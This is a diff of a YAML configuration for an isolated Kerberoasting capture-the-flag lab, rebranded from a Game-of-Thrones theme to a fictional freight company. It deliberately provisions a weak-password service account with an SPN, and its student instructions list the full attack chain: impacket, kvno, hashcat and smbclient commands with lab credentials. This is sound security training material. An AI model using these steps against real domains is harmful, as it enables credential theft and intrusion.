@@ -1,23 +1,24 @@
 # yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
-# Kerberoasting (GOAD-themed) as a single-container Isoloom lab: one Samba Active Directory
-# Domain Controller for NORTH.SEVENKINGDOMS.LOCAL, no Windows VMs. It provisions a foothold
-# user (hodor), a kerberoastable service account (svc_sql, with an MSSQL SPN and a weak RC4
-# key), and a vault share only svc_sql may read. The student roasts svc_sql from the attack
+# Kerberoasting as a single-container Isoloom lab: one Samba Active Directory Domain Controller
+# for MERIDIAN.LAB (Meridian Freight, a logistics company), no Windows VMs. It provisions a
+# foothold user (t.okonkwo, a dispatcher), a kerberoastable service account (svc-mssql-tms, the
+# Transport Management System's database account, with an MSSQL SPN and a weak RC4 key), and a
+# manifests share only svc-mssql-tms may read. The student roasts svc-mssql-tms from the attack
 # box, cracks the TGS, and reads the flag. `isoloom generate`, then `isothrum up . --target docker`.
 version: 1
 
-name: kerberoast-north
+name: kerberoast-meridian
 
 # Given by the CyberCTF launcher: this player's flag. Without it the development flag.
 inputs: [CTF_FLAG_MAIN]
 
 networks:
-  lab: { cidr: 10.61.12.0/24, internet: false }
+  lab: { cidr: 10.20.10.0/24, internet: false }
 
 machines:
   dc:
     networks: { lab: 10 }
-    aliases: [dc.north.sevenkingdoms.local, north.sevenkingdoms.local]
+    aliases: [dc.meridian.lab, meridian.lab]
     resources: { cpus: 4, memory_mb: 3072 }
     ports:
       dns:         { port: 53,   protocol: tcp }
@@ -31,7 +32,7 @@ machines:
       ldaps:       { port: 636,  protocol: tls }
       gc:          { port: 3268, protocol: tcp }
     # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism);
-    # provisioning copies it into the vault that only svc_sql may read.
+    # provisioning copies it into the manifests share that only svc-mssql-tms may read.
     files:
       - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
     app:
@@ -41,37 +42,39 @@ checks:
   - { name: the KDC answers, tcp: dc:88, wait: 120 }
   - { name: LDAP answers, tcp: dc:389, wait: 120 }
   - { name: SMB answers, tcp: dc:445, wait: 120 }
-  # End-to-end kerberoast, driven from inside the DC: hodor's TGS for svc_sql's SPN is
+  # End-to-end kerberoast, driven from inside the DC: t.okonkwo's TGS for svc-mssql-tms's SPN is
   # requested, cracked (hashcat 13100) to the weak password, and that password reads the flag.
   # Passes only when the DC is genuinely roastable; the heavy step is gated behind the ports.
-  - name: kerberoasting svc_sql recovers its password and unlocks the flag
+  - name: kerberoasting svc-mssql-tms recovers its password and unlocks the flag
     from: dc
     exec: /opt/kerberoast/check.sh
     expect: KERBEROAST_OK
     wait: 180
 
 message: |
-  # Kerberoasting — NORTH.SEVENKINGDOMS.LOCAL
+  # Kerberoasting — Meridian Freight (MERIDIAN.LAB)
 
-  A lone Active Directory Domain Controller (Samba) runs the realm **NORTH.SEVENKINGDOMS.LOCAL**:
+  **Meridian Freight** runs its logistics on a single Active Directory domain controller
+  (Samba) for the realm **MERIDIAN.LAB**:
 
-  - **DC:** `dc.north.sevenkingdoms.local` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
-  - **Your foothold (a normal domain user):** `hodor` / `Hodor123!`
+  - **DC:** `dc.meridian.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
+  - **Your foothold (a dispatcher's domain account):** `t.okonkwo` / `Dispatch!2024`
 
-  **Objective:** a service account is registered with a Service Principal Name, so any domain
-  user can request a Kerberos service ticket for it. The ticket is encrypted with the service
-  account's key — if that key is a weak password, you can crack it offline. Recover the service
-  account's password and use it to read the flag from a share you are not allowed into as `hodor`.
+  **Objective:** the company's Transport Management System connects to its database as a service
+  account that is registered with a Service Principal Name, so any domain user can request a
+  Kerberos service ticket for it. The ticket is encrypted with the service account's key — if
+  that key is a weak password, you can crack it offline. Recover the service account's password
+  and use it to read the flag from a share you are not allowed into as `t.okonkwo`.
 
   Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:
 
   1. **Find the roastable account (impacket):**
-     `GetUserSPNs.py -dc-ip {{ machines.dc.addresses.lab }} NORTH.SEVENKINGDOMS.LOCAL/hodor:'Hodor123!'`
-     → `svc_sql`, SPN `MSSQLSvc/dc.north.sevenkingdoms.local:1433`.
+     `GetUserSPNs.py -dc-ip {{ machines.dc.addresses.lab }} MERIDIAN.LAB/t.okonkwo:'Dispatch!2024'`
+     → `svc-mssql-tms`, SPN `MSSQLSvc/dc.meridian.lab:1433`.
   2. **Request and extract the TGS (native Kerberos — reliable against a Samba KDC):**
-     `kinit hodor` → `kvno MSSQLSvc/dc.north.sevenkingdoms.local:1433`, then pull the
+     `kinit t.okonkwo` → `kvno MSSQLSvc/dc.meridian.lab:1433`, then pull the
      `$krb5tgs$23$...` hash out of your credential cache.
-  3. **Crack it:** `hashcat -m 13100 tgs.hash rockyou.txt` (the password is a weak season+year word).
-  4. **Loot the flag:** `smbclient //dc/vault -U 'NORTH\svc_sql%<cracked>' -c 'get flag.txt'`.
+  3. **Crack it:** `hashcat -m 13100 tgs.hash rockyou.txt` (the password is a weak company+year word).
+  4. **Loot the flag:** `smbclient //dc/manifests -U 'MERIDIAN\svc-mssql-tms%<cracked>' -c 'get flag.txt'`.
 
   Submit the contents of `flag.txt`.
